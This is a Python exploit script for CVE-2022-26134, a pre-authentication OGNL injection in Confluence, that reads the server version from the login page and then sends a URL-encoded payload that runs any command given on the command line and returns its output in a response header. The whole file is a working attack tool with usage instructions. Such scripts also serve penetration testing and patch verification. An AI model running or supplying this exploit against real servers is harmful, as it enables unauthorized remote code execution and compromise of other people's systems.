# -*- coding: utf-8 -*-

# aybalas_cve_2022_26134_exploit

from bs4 import BeautifulSoup
# for pulling data out of HTML and XML files
import requests
import urllib3
import re
import sys
urllib3.disable_warnings()


def banner():
    print('CVE-2022-26134')
    print('Confluence Pre-Auth Remote Code Execution via OGNL Injection \n')

# host version check for vulnerability
def check_version(host):
  try:
    response = requests.get("{}/login.action".format(host), verify=False, timeout=8)
    if response.status_code == 200:
      filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
      
      if len(filter_version) >= 1:
        version = filter_version[0].split("'>")[1].split('</')[0]
        return version
      else:
        return False
    else:
      return host
  except:
    return False

# url encoded payload definition_RCE
def payload(host, command):   
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(command)
    response = requests.get("{}/{}/".format(host, payload), verify=False, allow_redirects=False)
    
    try:
      if response.status_code == 302:
          return response.headers["X-Cmd-Response"]
      else:
          return "Not vulnerable."
    except:
      return "Vulnerable, let's do it!."

# main function
def main():
  banner()
  if len(sys.argv) < 3:
    print("\033[1;94mFormat:\033[1;m")
    print("python3 {} http://url:8090 yourcommand".format(sys.argv[0]))
    return
  
  target = sys.argv[1]
  cmd = sys.argv[2]
  version = check_version(target)

  if version:
    print("Version: \033[1;94m{}\033[1;m".format(version))
  else:
    print("Can't find the used version, try again!")
    return
  
  exec_payload = payload(target, cmd) 
  print(exec_payload)

if __name__ == "__main__":
   main()

#end
